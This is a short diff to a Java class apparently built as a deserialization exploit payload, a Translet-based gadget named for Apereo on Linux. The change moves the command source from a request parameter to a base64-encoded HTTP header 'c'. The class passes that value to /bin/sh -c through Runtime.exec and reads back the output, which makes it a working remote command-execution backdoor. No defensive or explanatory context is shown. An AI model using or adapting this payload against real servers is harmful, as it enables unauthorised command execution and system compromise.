@@ -31,8 +31,8 @@ public class Apereo_linux extends AbstractTranslet implements Serializable {
 
 
             // exexute shell to base64
-            // String params = httprequest.getParameter("c");
-            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));
+            // String params = httprequest.getHeader("c");
+            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getHeader("c")));
             // String[] command = {"/bin/sh", "-c", params};
             InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", params}).getInputStream();
 
